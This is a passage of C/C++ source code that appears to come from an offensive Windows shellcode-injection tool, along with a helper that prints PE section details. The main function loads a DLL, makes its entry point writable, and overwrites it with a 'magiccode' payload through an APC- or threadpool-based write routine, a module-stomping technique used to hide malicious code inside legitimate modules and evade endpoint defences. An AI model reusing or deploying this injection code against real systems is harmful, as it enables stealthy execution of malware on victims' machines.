        fileHandle = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (fileHandle == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open DLL file. Error: %lu\n", GetLastError());
            return 1;
        }

        // Display debug message about opening DLL file
        printf("[+] DLL file opened successfully.\n");
    }
    // Open the DLL file with optional transaction
    // HANDLE fileHandle = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    // if (fileHandle == INVALID_HANDLE_VALUE) {
    //     printf("Failed to open DLL file. Error: %lu\n", GetLastError());
    //     return 1;
    // }

    // Create a section from the file
    HANDLE hSection = NULL;
    // LONG status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
    LONG status = NtCreateSection(&hSection, SECTION_MAP_READ, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
    if (status != 0) {
        printf("NtCreateSection failed. Status: %x\n", status);
        CloseHandle(fileHandle);
        return 1;
    }

    // Map the section into the process
    PVOID fileBase = NULL;
    SIZE_T viewSize = 0;
    status = NtMapViewOfSection(hSection, GetCurrentProcess(), &fileBase, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);
    if (status != 0) {
        printf("NtMapViewOfSection failed. Status: %x\n", status);
        CloseHandle(hSection);
        CloseHandle(fileHandle);
        return 1;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
    DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;

    // Load the DLL to get its base address in current process
    // HMODULE hDll = LoadLibraryW(dllPath);
    HMODULE hDll = dynamic::loadFuture(dllPath);

    if (hDll == NULL) {
        printf("Failed to load DLL. Error: %lu\n", GetLastError());
        UnmapViewOfFile(fileBase);
        CloseHandle(fileHandle);
        return 1;
    } else { 
		printf("[+] DLL loaded.\n");
	}

    // Calculate the AddressOfEntryPoint in current process
    // LPVOID dllEntryPoint = (LPVOID)(entryPointRVA + (DWORD_PTR)hDll);
	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
    PVOID dllEntryPoint = (PVOID)(entryPointRVA + (DWORD_PTR)hDll);
	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
    wprintf(L"Using DLL: %ls\n", dllPath);

    // Overwrite the AddressOfEntryPoint with magiccode
    // SIZE_T bytesWritten;
    // BOOL result = WriteProcessMemory(GetCurrentProcess(), dllEntryPoint, magiccode, sizeof(magiccode), &bytesWritten);

    ///////////////////////////// Let's get the memory protection of the target DLL's entry point before any modification: 
    HANDLE hProcess = GetCurrentProcess();
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T result;

    result = VirtualQueryEx(hProcess, dllEntryPoint, &mbi, sizeof(mbi));

    if (result == 0) {
        printf("VirtualQueryEx failed. Error: %lu\n", GetLastError());
    } else {
        printf("[+] Default memory protection before change in target DLL is: %s\n", ProtectionToString(mbi.Protect));
    }

    SIZE_T magiccodeSize = sizeof(magiccode);

    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, dllEntryPoint, magiccodeSize, PAGE_READWRITE, &oldProtect)) {
        printf("VirtualProtectEx failed to change memory protection. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    // printf("[+] Default memory protection before change in target DLL was: %s\n", ProtectionToString(oldProtect));

    if (hProcess != NULL) {
        result = WriteProcessMemoryAPC(hProcess, (BYTE*)dllEntryPoint, (BYTE*)magiccode, magiccodeSize, bUseRtlCreateUserThread, bUseCreateThreadpoolWait); 
    }

    if (!VirtualProtectEx(hProcess, dllEntryPoint, magiccodeSize, oldProtect, &oldProtect)) {
        printf("[-] VirtualProtectEx failed to restore original memory protection. Error: %lu\n", GetLastError());
    }
    printf("[+] Memory protection after change was: %s\n", ProtectionToString(oldProtect));

    if (result) {
        printf("Failed to write magiccode. Error: %lu\n", GetLastError());
        FreeLibrary(hDll);
        CloseHandle(hSection);
        UnmapViewOfFile(fileBase);
        // CloseHandle(fileMapping);
        CloseHandle(fileHandle);
        return 1;
    } else {
		printf("[+] Magic code written.\n");
	}

    // Create a thread to execute at the DLL's entry point
    // DWORD threadID;
    // HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, &threadID);
    // if (hThread == NULL) {
    //     printf("Failed to create a thread. Error: %lu\n", GetLastError());
    //     FreeLibrary(hDll);
    //     UnmapViewOfFile(fileBase);
    //     // CloseHandle(fileMapping);
    //     CloseHandle(fileHandle);
    //     CloseHandle(hSection);
    //     return 1;
    // }
	printf("[+] No need to create thread.\n");

    // Wait for the thread to execute and then clean up
    // WaitForSingleObject(hThread, INFINITE);
    // if (WaitForSingleObject(hThread, 5000) == WAIT_TIMEOUT) { // Wait 5 seconds
    //     TerminateThread(hThread, 0); // Forcibly terminates the thread
    //     printf("[+] Default thread was terminated.\n");
    // }

    // Get the exit code of the thread.
    // DWORD exitCode = 0;
    // if (!GetExitCodeThread(hThread, &exitCode)) {
    //     printf("[-] GetExitCodeThread failed: %d\n", GetLastError());
    // } else {
    //     printf("[+] Thread exited with code: %lu\n", exitCode);
    // }

    // CloseHandle(hThread);
    FreeLibrary(hDll);
    UnmapViewOfFile(fileBase);
    // CloseHandle(fileMapping);
    CloseHandle(fileHandle);
    CloseHandle(hSection);
    // Terminate the process
    ExitProcess(0);
    return 0;


}



BOOL PrintSectionDetails(const wchar_t* dllPath) {
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"Failed to open file %ls for section details. Error: %lu\n", dllPath, GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* fileBuffer = (BYTE*)malloc(fileSize);
    if (!fileBuffer) {
        CloseHandle(hFile);
        wprintf(L"Memory allocation failed for reading file %ls.\n", dllPath);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        free(fileBuffer);
        CloseHandle(hFile);
        wprintf(L"Failed to read file %ls. Error: %lu\n", dllPath, GetLastError());
        return FALSE;
    }

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileBuffer;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(fileBuffer + dosHeader->e_lfanew);
    wprintf(L"Details for %ls:\n", dllPath);
    wprintf(L"  Size of Image: 0x%X\n", ntHeaders->OptionalHeader.SizeOfImage); // Print Size of Image
    IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeaders->FileHeader.SizeOfOptionalHeader);

    wprintf(L"Details for %ls:\n", dllPath);
    wprintf(L"  Number of sections: %d\n", ntHeaders->FileHeader.NumberOfSections);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER* section = &sectionHeaders[i];
        wprintf(L"  Section %d: %.*S\n", i + 1, IMAGE_SIZEOF_SHORT_NAME, section->Name);
        wprintf(L"    Virtual Size: 0x%X\n", section->Misc.VirtualSize);
        wprintf(L"    Virtual Address: 0x%X\n", section->VirtualAddress);
        wprintf(L"    Size of Raw Data: 0x%X\n", section->SizeOfRawData);
    }

    free(fileBuffer);
    CloseHandle(hFile);
    return TRUE;
}
